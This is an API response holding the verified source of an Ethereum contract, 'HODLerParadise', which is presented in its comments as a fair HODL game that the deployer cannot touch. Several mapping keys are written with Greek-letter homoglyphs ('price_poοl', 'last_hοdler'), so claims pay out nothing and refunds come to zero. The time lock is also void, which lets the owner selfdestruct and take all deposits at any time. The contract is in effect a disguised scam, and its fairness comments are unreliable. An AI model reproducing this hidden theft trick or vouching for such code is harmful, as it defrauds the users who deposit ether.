{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.0;\r\n\r\n//\r\n// Welcome to the next level of Ethereum games: Are you weak-handed,  or a brave HODLer?\r\n// If you put ether into this contract, you are almost  guaranteed to get back more than\r\n// you put in the first place. Of course if you HODL too long, the price pool might be gone\r\n// before you claim the reward, but that's part of the game!\r\n//\r\n// The contract deployer is not allowed to do anything once the game is started.\r\n// (only kill the contract after there was no activity for a week)\r\n// \r\n// See get_parameters() for pricing and rewards.\r\n//\r\n\r\ncontract HODLerParadise{\r\n    struct User{\r\n        address hodler;\r\n        bytes32 passcode;\r\n        uint hodling_since;\r\n    }\r\n    User[] users;\r\n    mapping (string => uint) parameters;\r\n    \r\n    function HODLerParadise() public{\r\n        parameters[\"owner\"] = uint(msg.sender);\r\n    }\r\n    \r\n    function get_parameters() constant public returns(\r\n            uint price,\r\n            uint price_pool,\r\n            uint base_reward,\r\n            uint daily_reward,\r\n            uint max_reward\r\n        ){\r\n        price = parameters['price'];\r\n        price_pool = parameters['price_pool'];\r\n        base_reward = parameters['base_reward'];\r\n        daily_reward = parameters['daily_reward'];\r\n        max_reward = parameters['max_reward'];\r\n    }\r\n    \r\n    // Register as a HODLer.\r\n    // Passcode can be your password, or the hash of your password, your choice\r\n    // If it's not hashed, max password len is 16 characters.\r\n    function register(bytes32 passcode) public payable returns(uint uid)\r\n    {\r\n        require(msg.value >= parameters[\"price\"]);\r\n        require(passcode != \"\");\r\n\r\n        users.push(User(msg.sender, passcode, now));\r\n        \r\n        // leave some for the deployer\r\n        parameters[\"price_pool\"] += msg.value * 99 / 100;\r\n        parameters[\"last_hodler\"] = now;\r\n        \r\n        uid = users.length - 1;\r\n    }\r\n    \r\n    // OPTIONAL: Use this to securely hash your password before registering\r\n    function hash_passcode(bytes32 passcode) public pure returns(bytes32 hash){\r\n        hash = keccak256(passcode);\r\n    }\r\n    \r\n    // How much would you get if you claimed right now\r\n    function get_reward(uint uid) public constant returns(uint reward){\r\n        require(uid < users.length);\r\n        reward = parameters[\"base_reward\"] + parameters[\"daily_reward\"] * (now - users[uid].hodling_since) / 1 days;\r\n            reward = parameters[\"max_reward\"];\r\n    }\r\n    \r\n    // Is your password still working?\r\n    function is_passcode_correct(uint uid, bytes32 passcode) public constant returns(bool passcode_correct){\r\n        require(uid < users.length);\r\n        bytes32 passcode_actually = users[uid].passcode;\r\n        if (passcode_actually & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF == 0){\r\n            // bottom 16 bytes == 0: stored password was  not hashed\r\n            // (e.g. it looks like this: \"0x7265676973746572310000000000000000000000000000000000000000000000\" )\r\n            return passcode == passcode_actually;\r\n        } else {\r\n             // stored password is hashed\r\n            return keccak256(passcode) == passcode_actually;\r\n        }\r\n    }\r\n\r\n    // Get the price of your glorious HODLing!\r\n    function claim_reward(uint uid, bytes32 passcode) public payable\r\n    {\r\n        // a good HODLer always HODLs some more ether\r\n        require(msg.value >= parameters[\"price\"]);\r\n        require(is_passcode_correct(uid, passcode));\r\n        \r\n        uint final_reward = get_reward(uid) + msg.value;\r\n        if (final_reward > parameters[\"price_poοl\"])\r\n            final_reward = parameters[\"price_poοl\"];\r\n\r\n        require(msg.sender.call.value(final_reward)());\r\n\r\n        parameters[\"price_poοl\"] -= final_reward;\r\n        // Delete the user: copy last user to to-be-deleted user and shorten the array\r\n        if (uid + 1 < users.length)\r\n            users[uid] = users[users.length - 1];\r\n        users.length -= 1;\r\n    }\r\n    \r\n    // Refund the early HODLers, and leave the rest to the contract deployer\r\n    function refund_and_die() public{\r\n        require(msg.sender == address(parameters['owner']));\r\n        require(parameters[\"last_hοdler\"] + 7 days < now);\r\n        \r\n        uint price_pool_remaining = parameters[\"price_pοοl\"];\r\n        for(uint i=0; i<users.length && price_pool_remaining > 0; ++i){\r\n            uint reward = get_reward(i);\r\n            if (reward > price_pool_remaining)\r\n                reward = price_pool_remaining;\r\n            if (users[i].hodler.send(reward))\r\n                price_pool_remaining -= reward;\r\n        }\r\n        \r\n        selfdestruct(msg.sender);\r\n    }\r\n    \r\n    function check_parameters_sanity() internal view{\r\n        require(parameters['price'] <= 1 ether);\r\n        require(parameters['base_reward'] >= parameters['price'] / 2);\r\n        require(parameters[\"daily_reward\"] >= parameters['base_reward'] / 2);\r\n        require(parameters['max_reward'] >= parameters['price']);\r\n    }\r\n    \r\n    function set_parameter(string name, uint value) public{\r\n        require(msg.sender == address(parameters['owner']));\r\n        \r\n        // not even owner can touch these, that would be unfair!\r\n        require(keccak256(name) != keccak256(\"last_hodler\"));\r\n        require(keccak256(name) != keccak256(\"price_pool\"));\r\n\r\n        parameters[name] = value;\r\n        \r\n        check_parameters_sanity();\r\n    }\r\n    \r\n    function () public payable {\r\n        parameters[\"price_pool\"] += msg.value;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"get_parameters\",\"outputs\":[{\"name\":\"price\",\"type\":\"uint256\"},{\"name\":\"price_pool\",\"type\":\"uint256\"},{\"name\":\"base_reward\",\"type\":\"uint256\"},{\"name\":\"daily_reward\",\"type\":\"uint256\"},{\"name\":\"max_reward\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"uid\",\"type\":\"uint256\"}],\"name\":\"get_reward\",\"outputs\":[{\"name\":\"reward\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"uid\",\"type\":\"uint256\"},{\"name\":\"passcode\",\"type\":\"bytes32\"}],\"name\":\"is_passcode_correct\",\"outputs\":[{\"name\":\"passcode_correct\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"uid\",\"type\":\"uint256\"},{\"name\":\"passcode\",\"type\":\"bytes32\"}],\"name\":\"claim_reward\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"name\",\"type\":\"string\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"set_parameter\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"passcode\",\"type\":\"bytes32\"}],\"name\":\"hash_passcode\",\"outputs\":[{\"name\":\"hash\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"refund_and_die\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"passcode\",\"type\":\"bytes32\"}],\"name\":\"register\",\"outputs\":[{\"name\":\"uid\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"HODLerParadise","CompilerVersion":"v0.4.19+commit.c4cbbb05","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://55601c6052b439ca937c91da26d1c0c573ad4df08cc555cf51055ec81439c12b"}]}